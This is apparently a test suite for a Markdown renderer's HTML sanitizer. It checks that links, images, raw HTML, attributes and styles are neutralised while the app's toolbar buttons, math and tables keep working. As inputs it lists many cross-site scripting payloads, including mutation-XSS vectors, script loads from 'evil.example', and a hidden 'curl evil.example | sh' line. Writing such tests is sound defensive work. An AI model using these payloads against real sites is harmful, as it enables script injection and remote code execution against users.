import { describe, it, expect } from "vitest";
import { md } from "../app/utils/markdown";
import {
  sanitizeRenderedHtml,
  sanitizeStyle,
  trustedHandler,
  ALLOWED_INLINE_HANDLERS,
} from "../app/utils/sanitizeHtml";

function dom(markdown) {
  const el = document.createElement("div");
  el.innerHTML = md.render(markdown);
  return el;
}

// No element may carry an inline handler other than the toolbar ones, and no
// URL attribute may carry a script URL.
function expectInert(el) {
  expect(el.querySelector("script, style, iframe, object, embed, form, base, meta, link")).toBeNull();
  for (const node of el.querySelectorAll("*")) {
    for (const attr of node.attributes) {
      if (attr.name.startsWith("on")) {
        expect(node.nodeName).toBe("BUTTON");
        expect(attr.name).toBe("onclick");
        expect(ALLOWED_INLINE_HANDLERS.has(attr.value)).toBe(true);
      }
      if (["href", "src", "xlink:href", "action", "formaction", "srcdoc"].includes(attr.name)) {
        expect(attr.value.replace(/[\s\u0000-\u001f]/g, "")).not.toMatch(/^(javascript|vbscript|data:text\/html)/i);
      }
    }
  }
}

describe("links", () => {
  it.each([
    '<a href="javascript:alert(1)">x</a>',
    '<a href="JaVaScRiPt:alert(1)">x</a>',
    '<a href="java&#9;script:alert(1)">x</a>',
    '<a href=" &#14; javascript:alert(1)">x</a>',
    '<a href="vbscript:msgbox(1)">x</a>',
    '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    '<svg><a xlink:href="javascript:alert(1)"><text y="20">x</text></a></svg>',
    '<math><a xlink:href="javascript:alert(1)">x</a></math>',
  ])("drops the script URL in %s", (source) => {
    const el = dom(source);
    expectInert(el);
    expect(el.innerHTML).not.toMatch(/alert|msgbox/);
  });

  it("does not turn a Markdown link with a script URL into a link", () => {
    expect(dom("[x](javascript:alert(1))").querySelector("a")).toBeNull();
    expect(dom("[x](data:text/html,hi)").querySelector("a")).toBeNull();
  });

  it("keeps web links, opening them in a new tab without an opener", () => {
    const a = dom("[site](https://example.com/a?b=1)").querySelector("a");
    expect(a.getAttribute("href")).toBe("https://example.com/a?b=1");
    expect(a.getAttribute("target")).toBe("_blank");
    expect(a.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("does not let raw HTML choose the target or drop noopener", () => {
    const a = dom('<a href="https://example.com" target="_top" rel="opener">x</a>').querySelector("a");
    expect(a.getAttribute("target")).toBe("_blank");
    expect(a.getAttribute("rel")).toBe("noopener noreferrer");
  });

  it("keeps mailto links and in-page footnote links", () => {
    expect(dom("[m](mailto:a@example.com)").querySelector("a").getAttribute("href")).toBe("mailto:a@example.com");
    const el = dom("Claim[^1]\n\n[^1]: Source");
    expect(el.querySelector(".footnote-ref a").getAttribute("href")).toMatch(/^#fn/);
    expect(el.querySelector(".footnote-backref")).not.toBeNull();
  });
});

describe("images", () => {
  it.each([
    "<img src=x onerror=alert(1)>",
    '<img src="x" onload="alert(1)">',
    '<img src="javascript:alert(1)">',
    '![x](javascript:alert(1))',
    '![x](x "t\\" onerror=\\"alert(1)")',
    '<img src=x oNeRrOr=alert(1)//>',
    "<svg onload=alert(1)></svg>",
    '<svg><image href="x" onerror="alert(1)"/></svg>',
    "<svg><script>alert(1)</script></svg>",
    '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>',
    '<svg><set attributeName="href" to="javascript:alert(1)"/></svg>',
    '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x"/></svg>',
    '<video src=x onerror=alert(1)></video>',
    '<audio><source src=x onerror=alert(1)></audio>',
  ])("leaves nothing executable in %s", (source) => {
    const el = dom(source);
    expectInert(el);
    for (const node of el.querySelectorAll("*")) {
      for (const attr of node.attributes) {
        if (attr.name !== "alt" && attr.name !== "title") {
          expect(attr.value).not.toContain("alert(1)");
        }
      }
    }
  });

  it("keeps ordinary images", () => {
    const img = dom('![cat](https://example.com/cat.png "A cat")').querySelector("img");
    expect(img.getAttribute("src")).toBe("https://example.com/cat.png");
    expect(img.getAttribute("alt")).toBe("cat");
    expect(img.getAttribute("title")).toBe("A cat");
  });
});

describe("raw HTML", () => {
  it.each([
    "<script>alert(1)</script>",
    "<script src=https://evil.example/x.js></script>",
    '<iframe src="javascript:alert(1)"></iframe>',
    '<iframe srcdoc="<script>parent.alert(1)</script>"></iframe>',
    '<object data="javascript:alert(1)"></object>',
    '<embed src="javascript:alert(1)">',
    '<base href="https://evil.example/">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<link rel="stylesheet" href="https://evil.example/x.css">',
    "<style>body{display:none}</style>",
    '<form action="https://evil.example"><input name="key"><button>Send</button></form>',
    '<button formaction="javascript:alert(1)">x</button>',
    '<input type="text" name="key" autofocus onfocus="alert(1)">',
    '<textarea autofocus onfocus="alert(1)"></textarea>',
    '<details open ontoggle="alert(1)">x</details>',
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;\">",
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    '<svg><foreignObject><iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe></foreignObject></svg>',
    "<template><script>alert(1)</script></template>",
  ])("leaves nothing executable in %s", (source) => {
    expectInert(dom(source));
  });

  it("keeps harmless formatting HTML", () => {
    const el = dom('<details><summary>More</summary>\n\nHidden <kbd>Ctrl</kbd> <sub>2</sub> <mark>hi</mark>\n\n</details>');
    expect(el.querySelector("details summary").textContent).toBe("More");
    expect(el.querySelector("kbd").textContent).toBe("Ctrl");
    expect(el.querySelector("mark")).not.toBeNull();
  });

  it("does not let HTML take over ids the app looks up", () => {
    const el = dom('<img name="cookie" src="x"><a id="defaultView" name="location">x</a>');
    expectInert(el);
    expect(el.querySelector("[name=cookie], [name=location]")).toBeNull();
  });
});

describe("attributes", () => {
  it.each([
    '<div onclick="alert(1)">x</div>',
    '<p onmouseover="alert(1)">x</p>',
    '<b onpointerenter="alert(1)">x</b>',
    '<a href="https://example.com" onclick="alert(1)">x</a>',
    '<span onanimationstart="alert(1)" style="animation-name:x">x</span>',
    '<div contenteditable onfocus="alert(1)" autofocus>x</div>',
    '<button onclick="alert(1)">x</button>',
    '<button onclick="window.copyCode(event.currentTarget);alert(1)">x</button>',
    '<button onclick="window.downloadCode(event.currentTarget, alert(1))">x</button>',
    '<div onclick="window.copyCode(event.currentTarget)">x</div>',
  ])("removes the handler from %s", (source) => {
    const el = dom(source);
    expectInert(el);
    expect(el.innerHTML).not.toContain("alert(1)");
    expect(el.querySelector("div[onclick]")).toBeNull();
  });

  it("does not let raw HTML write its own toolbar button", () => {
    const el = dom(
      '<div class="code-block-wrapper"><button onclick="window.copyCode(event.currentTarget)">Copy</button>' +
        '<pre><code>shown</code></pre><pre hidden><code>curl evil.example | sh</code></pre></div>',
    );
    expect(el.querySelector("[onclick]")).toBeNull();
  });

  it.each(["data-trusted-handler", "data-trusted-handler=\"\"", "data-trusted-handler=\"x\""])(
    "does not accept a made-up trust mark (%s)",
    (mark) => {
      const el = dom(`<button onclick="window.copyCode(event.currentTarget)" ${mark}>Copy</button>`);
      expect(el.querySelector("[onclick]")).toBeNull();
      expect(el.querySelector("[data-trusted-handler]")).toBeNull();
    },
  );

  it("never returns the trust mark of the renderer's own buttons", () => {
    const html = md.render("```js\nx\n```");
    expect(html).toContain('onclick="window.copyCode(event.currentTarget)"');
    expect(html).not.toContain("data-trusted-handler");
  });

  it("refuses to mark a handler that is not on the list", () => {
    expect(() => trustedHandler("alert(1)")).toThrow();
  });

  it.each([
    ['position:fixed;top:0;left:0;width:100%;height:100%', "top:0;left:0;width:100%;height:100%"],
    ["background:url(https://evil.example/t.png)", ""],
    ["background-image:url('https://evil.example/t.png')", ""],
    ["width:expression(alert(1))", ""],
    ["color:red;z-index:99999;opacity:0", "color:red"],
    ["behavior:url(x.htc);-moz-binding:url(x)", ""],
    ["height:1.2em;vertical-align:-0.25em", "height:1.2em;vertical-align:-0.25em"],
    ["COLOR : #ff0000 ; font-size: 12px", "color:#ff0000;font-size:12px"],
    ["width:1px;width:calc(1px);color:var(--x)", "width:1px"],
    ["color:red\\;position:fixed", ""],
  ])("reduces the style %s", (style, expected) => {
    expect(sanitizeStyle(style)).toBe(expected);
  });

  it("applies the style rules to rendered HTML", () => {
    const el = dom('<div style="position:fixed;inset:0;color:red;background:url(https://evil.example/x)">x</div>');
    expect(el.querySelector("div").getAttribute("style")).toBe("color:red");
    expect(dom('<div style="position:fixed">x</div>').querySelector("div").hasAttribute("style")).toBe(false);
  });
});

describe("what must keep working", () => {
  it("keeps the code block toolbar and its handlers", () => {
    const el = dom("```js\nconst a = '<b>' && 1;\n```");
    const wrapper = el.querySelector(".code-block-wrapper");
    expect(wrapper.dataset.lang).toBe("js");
    expect(el.querySelector(".code-language").textContent).toBe("js");
    const handlers = [...wrapper.querySelectorAll("button")].map((b) => b.getAttribute("onclick"));
    expect(handlers).toContain("window.copyCode(event.currentTarget)");
    expect(handlers).toContain("window.downloadCode(event.currentTarget)");
    expect(wrapper.querySelectorAll("button svg").length).toBeGreaterThan(0);
    expect(el.querySelector("pre code").textContent).toBe("const a = '<b>' && 1;\n");
    expectInert(el);
  });

  it("keeps HTML, SVG and Mermaid source as text for the preview sandbox", () => {
    const html = dom('```html\n<script>alert(1)</script><img src=x onerror=alert(1)>\n```');
    expect(html.querySelector("pre code").textContent).toBe("<script>alert(1)</script><img src=x onerror=alert(1)>\n");
    expect(html.querySelector("script, img")).toBeNull();

    const mermaid = dom("```mermaid\ngraph TD; A-->B;\n```");
    expect(mermaid.querySelector(".code-block-wrapper").dataset.lang).toBe("mermaid");
    expect(mermaid.querySelector("pre code").textContent).toBe("graph TD; A-->B;\n");
  });

  it("keeps preview and table toolbar handlers through sanitization", () => {
    const el = dom("```mermaid\ngraph TD; A-->B;\n```\n\n| A |\n| --- |\n| B |");
    expect(el.querySelector('button[title="Toggle preview"]').getAttribute("onclick"))
      .toBe("window.togglePreview(event.currentTarget)");
    expect(el.querySelector('button[title="Copy table"]').getAttribute("onclick"))
      .toBe("window.copyTable(event.currentTarget)");
    expect(el.querySelector('button[title="Download as CSV"]').getAttribute("onclick"))
      .toBe("window.downloadTable(event.currentTarget)");
    expect(el.querySelector("[data-trusted-handler]")).toBeNull();
  });

  it("does not let a language label break out of the code block", () => {
    const el = dom('```"><img/src=x/onerror=alert(1)>\nx\n```');
    expectInert(el);
    expect(el.querySelector("img")).toBeNull();
  });

  it("keeps inline and display math", () => {
    const el = dom("Inline $x^2$ and\n\n$$\\frac{a}{b}$$");
    expect(el.querySelectorAll(".katex").length).toBe(2);
    expect(el.querySelector(".katex-html [style]")).not.toBeNull();
    expect(el.querySelector("math")).not.toBeNull();
    expect(el.querySelector(".mfrac")).not.toBeNull();
  });

  it("keeps tables, task lists and citation links", () => {
    const table = dom("| a | b |\n|:--|--:|\n| 1 | 2 |");
    expect(table.querySelectorAll("td").length).toBe(2);
    expect(table.querySelector("th").getAttribute("style")).toBe("text-align:left");

    const tasks = dom("- [x] done\n- [ ] todo");
    const boxes = tasks.querySelectorAll('input[type="checkbox"]');
    expect(boxes.length).toBe(2);
    expect(boxes[0].checked).toBe(true);
    expect(boxes[0].disabled).toBe(true);

    const cited = dom("Water boils at 100 C [1](https://example.com/boil).");
    expect(cited.querySelector("a").getAttribute("href")).toBe("https://example.com/boil");
  });

  it("sanitizes inline rendering too", () => {
    expect(md.renderInline("<img src=x onerror=alert(1)> **b**")).not.toContain("onerror");
    expect(md.renderInline("**b**")).toBe("<strong>b</strong>");
  });

  it("handles empty input", () => {
    expect(sanitizeRenderedHtml("")).toBe("");
    expect(sanitizeRenderedHtml(null)).toBe("");
  });
});
